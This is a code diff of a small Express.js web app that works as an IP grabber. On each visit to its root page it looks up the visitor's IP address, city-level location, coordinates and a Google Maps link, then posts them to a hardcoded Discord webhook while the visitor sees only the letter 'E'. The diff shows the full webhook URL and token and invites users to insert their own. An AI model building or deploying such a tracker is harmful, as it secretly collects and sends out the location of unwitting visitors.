@@ -8,7 +8,7 @@ app.get('/', async (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const ipInfo = await getIPInfo(ip);
   send(ipInfo);
-  res.send('L O R C A - https://github.com/lorcadev');
+  res.send('E');
 });
 // TYPE UR OWN WEBHOOK URL 
 const webhookUrl = 'https://discord.com/api/webhooks/1269248207158771742/k1QTUI3ks6mmVE6Jc9oFCBs-dHfzCaAuah5a1R8hV2yPNRvTXAn0Hbyz06UVMrkeI3US';
@@ -40,7 +40,8 @@ function send(ipInfo) {
    * :envelope: Zip: ${ipInfo.zip}
    * :map: Cordinations: ${ipInfo.lat}, ${ipInfo.lon}
    * :${flag}: Country: ${ipInfo.country}
-   * :map: [Google Maps / Adress](https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon})
+   * :map: [Google Maps / Address](https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon})
+   * :The Google Maps / Address is not always right so womp womp
   `;;
 
   axios.post(webhookUrl, {
